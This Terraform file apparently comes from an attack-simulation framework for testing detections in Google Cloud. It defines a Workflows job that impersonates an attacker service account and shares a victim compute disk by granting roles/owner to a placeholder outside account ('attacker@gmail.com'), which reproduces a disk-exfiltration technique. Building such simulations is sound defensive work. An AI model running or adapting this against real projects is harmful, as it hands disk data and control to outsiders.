data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_share_compute_disk_attack" {
  name            = "gcp-share-compute-disk-srt"
  description     = "A workflow intended to match the functionality of the Status Red Team attack technique 'Exfiltrate Compute Disk by sharing it': https://stratus-red-team.cloud/attack-techniques/GCP/gcp.exfiltration.share-compute-disk/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################
## This attack technique shares a compute disk with a ficticious GCP Project. 
## The attacker could then create a snapshot of the disk in their GCP project.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"sa":"01"}
##### INPUT: {"sa":"02"}


######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-GCP-Share-Compute-Disk-WORKFLOWEXECUTIONID"


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - sa: $${args.sa}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")} 
    - ImpersonateDeRFAttackerServiceAccount:
        call: ImpersonateDeRFAttackerServiceAccount
        args:
            attackerSa: $${sa}
        result: AccessToken
    - ShareComputeDisk:
        call: ShareComputeDisk
        args:
            AccessToken: $${AccessToken}
        result: response
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
ImpersonateDeRFAttackerServiceAccount:
  params: [attackerSa]
  steps: 
    - buildURL:
        assign:
        - a: 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/derf-attacker-sa-'
        - b: '@'
        - c: ${var.gcp_derf_project_id}
        - d: '.iam.gserviceaccount.com:generateAccessToken'
        - e: '$${a+attackerSa+b+c+d}'   
    - ImpersonateTargetSA:
        call: http.post
        args:
          url: $${e}
          auth:
              type: OAuth2
          headers:
            Content-Type: application/json
            User-Agent: '$${"Derf-GCP-Share-Compute-Disk=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
          body: 
            delegates: null
            scope: https://www.googleapis.com/auth/cloud-platform
            lifetime: 3600s
        result: response
    - return:
        return: $${response.body.accessToken}

ShareComputeDisk:
  params: [AccessToken]
  steps:
    - ShareComputeDisk:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-Share-Compute-Disk=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP Share Compute Disk - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP Impersonate Service Account Attack"


  EOF

}
